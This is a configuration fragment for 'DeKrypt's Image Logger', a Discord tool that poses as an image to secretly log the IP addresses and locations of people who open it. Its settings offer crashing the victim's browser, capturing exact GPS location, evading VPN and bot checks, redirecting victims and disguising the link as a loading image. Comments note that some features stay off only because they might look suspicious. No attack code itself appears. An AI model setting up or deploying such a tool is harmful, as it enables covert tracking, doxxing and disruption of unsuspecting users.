# CUSTOMIZATION #
"username": "Image Logger", # Set this to the name you want the webhook to have
"color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

# OPTIONS #
"crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)

"accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

"message": { # Show a custom message when the user opens the image
    "doMessage": False, # Enable the custom message?
    "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
    "richMessage": True, # Enable rich text? (See README for more info)
},

"vpnCheck": 1, # Prevents VPNs from triggering the alert
            # 0 = No Anti-VPN
            # 1 = Don't ping when a VPN is suspected
            # 2 = Don't send an alert when a VPN is suspected

"linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
"buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

"antiBot": 1, # Prevents bots from triggering the alert
            # 0 = No Anti-Bot
            # 1 = Don't ping when it's possibly a bot
            # 2 = Don't ping when it's 100% a bot
            # 3 = Don't send an alert when it's possibly a bot
            # 4 = Don't send an alert when it's 100% a bot


# REDIRECTION #
"redirect": {
    "redirect": False, # Redirect to a webpage?
    "page": "https://your-link.here" # Link to the webpage to redirect to 
},

# Please enter all values in correct format. Otherwise, it may break.
# Do not edit anything below this, unless you know what you're doing.
# NOTE: Hierarchy tree goes as follows:
# 1) Redirect (If this is enabled, disables image and crash browser)
# 2) Crash Browser (If this is enabled, disables image)
# 3) Message (If this is enabled, disables image)
# 4) Image 
